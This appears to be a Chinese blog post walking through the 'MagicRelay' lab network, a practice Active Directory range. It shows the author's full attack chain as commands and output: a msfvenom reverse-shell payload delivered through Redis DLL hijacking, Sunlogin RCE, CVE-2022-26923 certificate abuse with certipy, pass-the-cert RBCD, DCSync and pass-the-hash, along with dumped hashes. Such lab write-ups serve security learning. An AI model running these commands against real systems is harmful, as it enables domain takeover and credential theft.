<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 5.2.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">

<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" integrity="sha256-wiz7ZSCn/btzhjKDQBms9Hx4sSeUYsDrTLg7roPstac=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Mist","darkmode":false,"version":"8.19.2","exturl":false,"sidebar":{"position":"right","width":200,"display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.json","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>



<link rel="canonical" href="http://example.com/2025/05/25/MagicRelay/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://example.com/2025/05/25/MagicRelay/","path":"2025/05/25/MagicRelay/","title":"春秋云境-MagicRelay"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>春秋云境-MagicRelay | Y0ng's Blog</title>
  








  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">Y0ng's Blog</p>
      <i class="logo-line"></i>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="搜索" role="button">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup"><div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off" maxlength="80"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close" role="button">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div class="search-result-container no-result">
  <div class="search-result-icon">
    <i class="fa fa-spinner fa-pulse fa-5x"></i>
  </div>
</div>

    </div>
  </div>

</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%AD%A6%E4%B9%A0%E7%82%B9"><span class="nav-text">学习点</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#redis-dll-%E5%8A%AB%E6%8C%81"><span class="nav-text">redis dll 劫持</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%90%91%E6%97%A5%E8%91%B5RCE"><span class="nav-text">向日葵RCE</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#CVE-2022-26923"><span class="nav-text">CVE-2022-26923</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#PTC%EF%BC%88RBCD%EF%BC%89"><span class="nav-text">PTC（RBCD）</span></a></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">Y0ng</p>
  <div class="site-description" itemprop="description"></div>
</div>

        </div>
      </div>
    </div>

    
  </aside>


    </div>

    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2025/05/25/MagicRelay/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Y0ng">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Y0ng's Blog">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="春秋云境-MagicRelay | Y0ng's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          春秋云境-MagicRelay
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2025-05-25 22:30:00" itemprop="dateCreated datePublished" datetime="2025-05-25T22:30:00+08:00">2025-05-25</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E4%BA%91%E5%A2%83%E9%9D%B6%E5%9C%BA/" itemprop="url" rel="index"><span itemprop="name">云境靶场</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody"><!--more-->

<img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/0b83b2ee7a7ea57e67ba88c9327a3c60.png" style="zoom:67%;" />


<h1 id="学习点"><a href="#学习点" class="headerlink" title="学习点"></a>学习点</h1><p>一、  CVE-2022-26923 ADCS 权限提升：</p>
<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/FR9VYJAnPJX4L4KYSD55bA">CVE-2022-26923 AD域提权漏洞深入分析</a></p>
<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/C3It3HI1bpjc5p4O9lJ4Cg">Active Directory 域服务特权提升漏洞 CVE-2022–26923</a></p>
<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/3DZPkG4Z9w8xbVKvW64Mgw">cve-2022-26923漏洞复现+踩坑记录</a></p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/335471.html">Windows域提权漏洞CVE-2022-26923分析与复现</a></p>
<p>机器账户申请证书时，CA 将从 AD 中请求者用户对象的dNSHostName属性获得的值添加到已颁发证书的主题备用名称中进行识别，dNSHostName属性在AD中不要求唯一，所以可以通过修改成与任意DC相同的dNSHostName来达到欺骗ADCS的效果，从而生成DC的机器证书，实现域内提权。</p>
<p>二、Pass the Certificate（Schannel）</p>
<ul>
<li><p>PKINIT 是 Kerberos 协议的一个标准扩展，允许用户用 <strong>同时包含私钥和公钥证书的打包文件(.pfx)</strong> 代替密码完成初始认证来获取 TGT</p>
</li>
<li><p>Schannel 是 Windows 实现的一个 TLS/SSL 协议栈，它负责实现 TLS 握手、加密通信和证书验证。它提供了一整套 API，应用程序（比如 Kerberos 客户端或服务端）通过调用 Schannel 来完成 TLS 连接中的加密和证书相关操作</p>
</li>
</ul>
<p>即 <strong>Schannel 是 Windows 底层的 TLS/证书验证实现，PKINIT 的实现会用到它来完成证书的处理和安全通信。</strong></p>
<p>当某些域控制器不支持 PKINIT时，通常是因为域控制器所使用的证书中，缺少了用于智能卡登录的 EKU（ Smart Card Logon EKU），往往会返回一个错误代码：<code>KDC_ERR_PADATA_TYPE_NOSUPP</code>，表示不支持请求中的预认证数据类型，此时可以使用 Schannel 继续进行认证</p>
<p><a target="_blank" rel="noopener" href="https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html">Authenticating with certificates when PKINIT is not supported</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/AlmondOffSec/PassTheCert/">https://github.com/AlmondOffSec/PassTheCert/</a></p>
<hr>
<table>
<thead>
<tr>
<th>172.22.12.25</th>
<th>WIN-YUYAOX9Q.xiaorang.lab</th>
<th>redis</th>
</tr>
</thead>
<tbody><tr>
<td>172.22.12.6</td>
<td>WIN-SERVER.xiaorang.lab</td>
<td>DC域控</td>
</tr>
<tr>
<td>172.22.12.31</td>
<td>WORKGROUP\WIN-IISQE3PC</td>
<td>IIS网站 ftp匿名 向日葵rce</td>
</tr>
<tr>
<td>172.22.12.12</td>
<td>WIN-AUTHORITY.xiaorang.lab</td>
<td>CA服务器</td>
</tr>
</tbody></table>
<h1 id="redis-dll-劫持"><a href="#redis-dll-劫持" class="headerlink" title="redis dll 劫持"></a>redis dll 劫持</h1><p>redis劫持dll上线：<a target="_blank" rel="noopener" href="https://github.com/P4r4d1se/dll_hijack">https://github.com/P4r4d1se/dll_hijack</a>   、 <a target="_blank" rel="noopener" href="https://github.com/0671/RabR">https://github.com/0671/RabR</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;xxx LPORT&#x3D;4444 -f c</span><br><span class="line">python3 redis-attack.py -r 39.99.159.129 -L xxx -wf dbghelp.dll</span><br></pre></td></tr></table></figure>

<p>抓hash</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: WIN-YUYAOX9Q\Administrator</span><br><span class="line"></span><br><span class="line">meterpreter &gt; cat Administrator&#x2F;flag&#x2F;flag01.txt</span><br><span class="line"> ________ ___       ________  ________  ________    _____     </span><br><span class="line">|\  _____\\  \     |\   __  \|\   ____\|\   __  \  &#x2F; __  \    </span><br><span class="line">\ \  \__&#x2F;\ \  \    \ \  \|\  \ \  \___|\ \  \|\  \|\&#x2F;_|\  \   </span><br><span class="line"> \ \   __\\ \  \    \ \   __  \ \  \  __\ \  \\\  \|&#x2F; \ \  \  </span><br><span class="line">  \ \  \_| \ \  \____\ \  \ \  \ \  \|\  \ \  \\\  \   \ \  \ </span><br><span class="line">   \ \__\   \ \_______\ \__\ \__\ \_______\ \_______\   \ \__\</span><br><span class="line">    \|__|    \|_______|\|__|\|__|\|_______|\|_______|    \|__|</span><br><span class="line"></span><br><span class="line">flag01: flag&#123;58455a83-7516-4a8f-92bf-ca94e7aa33a0&#125;</span><br><span class="line"></span><br><span class="line">meterpreter &gt; getsystem</span><br><span class="line">...got system via technique 1 (Named Pipe Impersonation (In Memory&#x2F;Admin)).</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br><span class="line">meterpreter &gt; hashdump</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:abf1bda66923f85bba8a99d43f18c846:::</span><br><span class="line">DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:cb7414c1c58bd89074b0ee9c5f0e78e7:::</span><br><span class="line">Xunyu:1000:aad3b435b51404eeaad3b435b51404ee:91111a7007fdcbcbff8972ab2f30b83d:::</span><br><span class="line">meterpreter &gt; creds_all</span><br><span class="line">[+] Running as SYSTEM</span><br><span class="line">[*] Retrieving all credentials</span><br><span class="line">msv credentials</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">Username       Domain        NTLM                              SHA1</span><br><span class="line">--------       ------        ----                              ----</span><br><span class="line">Administrator  WIN-YUYAOX9Q  abf1bda66923f85bba8a99d43f18c846  bbff6286fb932f6d5f4bba1351cee28d4a21108e</span><br><span class="line">WIN-YUYAOX9Q$  XIAORANG      e611213c6a712f9b18a8d056005a4f0f  1a8d2c95320592037c0fa583c1f62212d4ff8ce9</span><br></pre></td></tr></table></figure>



<h1 id="向日葵RCE"><a href="#向日葵RCE" class="headerlink" title="向日葵RCE"></a>向日葵RCE</h1><p>172.22.12.31开启ftp，发现有向日葵，工具：<a target="_blank" rel="noopener" href="https://github.com/Mr-xn/sunlogin_rce">https://github.com/Mr-xn/sunlogin_rce</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">xrkRce.exe -h 172.22.12.31  -t scan -p 30000-50000</span><br><span class="line">xrkRce.exe -h 172.22.12.31  -t rce -p 49687 -c &quot;type C:\Users\Administrator\flag\flag02.txt&quot;</span><br></pre></td></tr></table></figure>

<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20250525220434976.png" alt="image-20250525220434976"></p>
<h1 id="CVE-2022-26923"><a href="#CVE-2022-26923" class="headerlink" title="CVE-2022-26923"></a>CVE-2022-26923</h1><p>redis机器提权到system做域内信息收集，因为域内有CA，重点关注利用ADCS这一块的漏洞</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\Users\Public\Downloads&gt;Certify.exe find &#x2F;vulnerable</span><br><span class="line">Certify.exe find &#x2F;vulnerable</span><br><span class="line"></span><br><span class="line">   _____          _   _  __              </span><br><span class="line">  &#x2F; ____|        | | (_)&#x2F; _|             </span><br><span class="line"> | |     ___ _ __| |_ _| |_ _   _        </span><br><span class="line"> | |    &#x2F; _ \ &#39;__| __| |  _| | | |      </span><br><span class="line"> | |___|  __&#x2F; |  | |_| | | | |_| |       </span><br><span class="line">  \_____\___|_|   \__|_|_|  \__, |   </span><br><span class="line">                             __&#x2F; |       </span><br><span class="line">                            |___.&#x2F;        </span><br><span class="line">  v1.1.0                               </span><br><span class="line"></span><br><span class="line">[*] Action: Find certificate templates</span><br><span class="line">[*] Using the search base &#39;CN&#x3D;Configuration,DC&#x3D;xiaorang,DC&#x3D;lab&#39;</span><br><span class="line"></span><br><span class="line">[*] Listing info about the Enterprise CA &#39;xiaorang-WIN-AUTHORITY-CA&#39;</span><br><span class="line"></span><br><span class="line">    Enterprise CA Name            : xiaorang-WIN-AUTHORITY-CA</span><br><span class="line">    DNS Hostname                  : WIN-AUTHORITY.xiaorang.lab</span><br><span class="line">    FullName                      : WIN-AUTHORITY.xiaorang.lab\xiaorang-WIN-AUTHORITY-CA</span><br><span class="line">    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED</span><br><span class="line">    Cert SubjectName              : CN&#x3D;xiaorang-WIN-AUTHORITY-CA, DC&#x3D;xiaorang, DC&#x3D;lab</span><br><span class="line">    Cert Thumbprint               : 10944A7D8B6C6CBC7EE267DD6DBF3C0624FE7F08</span><br><span class="line">    Cert Serial                   : 2E92B9E129A646B84641219EFBDB1EB3</span><br><span class="line">    Cert Start Date               : 2022&#x2F;10&#x2F;29 10:50:19</span><br><span class="line">    Cert End Date                 : 2027&#x2F;10&#x2F;29 11:00:19</span><br><span class="line">    Cert Chain                    : CN&#x3D;xiaorang-WIN-AUTHORITY-CA,DC&#x3D;xiaorang,DC&#x3D;lab</span><br><span class="line">    UserSpecifiedSAN              : Disabled</span><br><span class="line">    CA Permissions                :</span><br><span class="line">      Owner: BUILTIN\Administrators        S-1-5-32-544</span><br><span class="line"></span><br><span class="line">      Access Rights                                     Principal</span><br><span class="line"></span><br><span class="line">      Allow  Enroll                                     NT AUTHORITY\Authenticated UsersS-1-5-11</span><br><span class="line">      Allow  ManageCA, ManageCertificates               BUILTIN\Administrators        S-1-5-32-544</span><br><span class="line">      Allow  ManageCA, ManageCertificates               XIAORANG\Domain Admins        S-1-5-21-3745972894-1678056601-2622918667-512</span><br><span class="line">      Allow  ManageCA, ManageCertificates               XIAORANG\Enterprise Admins    S-1-5-21-3745972894-1678056601-2622918667-519</span><br><span class="line">    Enrollment Agent Restrictions : None</span><br><span class="line"></span><br><span class="line">[+] No Vulnerable Certificates Templates found!</span><br><span class="line"></span><br><span class="line">Certify completed in 00:00:00.7878454</span><br></pre></td></tr></table></figure>

<p>并无常规ESC可利用，尝试利用 CVE-2022-26923</p>
<p>添加账号成功，说明存在CVE-2022-26923</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">certipy-ad account create -u WIN-YUYAOX9Q$ -hashes e611213c6a712f9b18a8d056005a4f0f  -dc-ip 172.22.12.6 -user evil -pass Qwer1234 -dns WIN-SERVER.xiaorang.lab -debug</span><br></pre></td></tr></table></figure>

<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20250525222255199.png" alt="image-20250525222255199"></p>
<p>配置hosts</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">172.22.12.6 WIN-SERVER.xiaorang.lab</span><br><span class="line">172.22.12.12 WIN-AUTHORITY.xiaorang.lab</span><br><span class="line">172.22.12.12 xiaorang-WIN-AUTHORITY-CA</span><br></pre></td></tr></table></figure>

<p>请求证书</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">certipy-ad req -u &#39;evil$@xiaorang.lab&#39; -p Qwer1234 -ca &#39;xiaorang-WIN-AUTHORITY-CA&#39; -target 172.22.12.12 -template Machine -dc-ip 172.22.12.6 -debug</span><br></pre></td></tr></table></figure>

<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20250525222338223.png" alt="image-20250525222338223"></p>
<p>认证证书</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">certipy-ad auth -pfx win-server.pfx -dc-ip 172.22.12.6 -debug</span><br></pre></td></tr></table></figure>

<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20250525222429807.png" alt="image-20250525222429807"></p>
<p>报错 <code>KDC_ERR_PADATA_TYPE_NOSUPP</code></p>
<h1 id="PTC（RBCD）"><a href="#PTC（RBCD）" class="headerlink" title="PTC（RBCD）"></a>PTC（RBCD）</h1><p>由于不支持PKINIT，尝试利用Schannel协议进行Pass The Cert，提取密钥与证书</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">certipy-ad cert -pfx win-server.pfx -nokey -out win-server.crt</span><br><span class="line">certipy-ad cert -pfx win-server.pfx -nocert -out win-server.key </span><br></pre></td></tr></table></figure>

<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20250525222609945.png" alt="image-20250525222609945"></p>
<p>利用证书进行认证后，配置域控的RBCD到一开始创建的新用户上</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 passthecert.py -action write_rbcd -crt win-server.crt -key win-server.key -domain xiaorang.lab -dc-ip 172.22.12.6 -delegate-from &#39;evil$&#39; -delegate-to &#39;win-server$&#39;</span><br></pre></td></tr></table></figure>

<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20250525222809036.png" alt="image-20250525222809036"></p>
<p>PTT</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">impacket-getST xiaorang.lab&#x2F;&#39;evil$&#39;:Qwer1234 -spn cifs&#x2F;win-server.xiaorang.lab -impersonate Administrator -dc-ip 172.22.12.6</span><br><span class="line">export KRB5CCNAME&#x3D;Administrator@cifs_win-server.xiaorang.lab@XIAORANG.LAB.ccache</span><br><span class="line">impacket-wmiexec WIN-SERVER.xiaorang.lab -no-pass -k -dc-ip 172.22.12.6</span><br></pre></td></tr></table></figure>

<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20250525222924076.png" alt="image-20250525222924076"></p>
<p>Dcsync dump hash</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">impacket-secretsdump WIN-SERVER.xiaorang.lab -no-pass -k -dc-ip 172.22.12.6 -just-dc-ntlm -user-status</span><br></pre></td></tr></table></figure>

<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20250525223656907.png" alt="image-20250525223656907"></p>
<p>PTH</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">impacket-wmiexec xiaorang.lab&#x2F;Administrator@WIN-AUTHORITY -hashes :aa95e708a5182931157a526acf769b13</span><br></pre></td></tr></table></figure>


    </div>

    
    
    

    <footer class="post-footer">

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2025/05/24/Delivery/" rel="prev" title="春秋云境-Delivery">
                  <i class="fa fa-angle-left"></i> 春秋云境-Delivery
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/2025/05/26/GreatWall/" rel="next" title="春秋云境-GreatWall">
                  春秋云境-GreatWall <i class="fa fa-angle-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">

  <div class="copyright">
    &copy; 
    <span itemprop="copyrightYear">2025</span>
    <span class="with-love">
      <i class="fa fa-heart"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">Y0ng</span>
  </div>

    </div>
  </footer>

  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>
  <div class="sidebar-dimmer"></div>
  <div class="back-to-top" role="button" aria-label="返回顶部">
    <i class="fa fa-arrow-up fa-lg"></i>
    <span>0%</span>
  </div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
<script src="/js/third-party/search/local-search.js"></script>







  





</body>
</html>
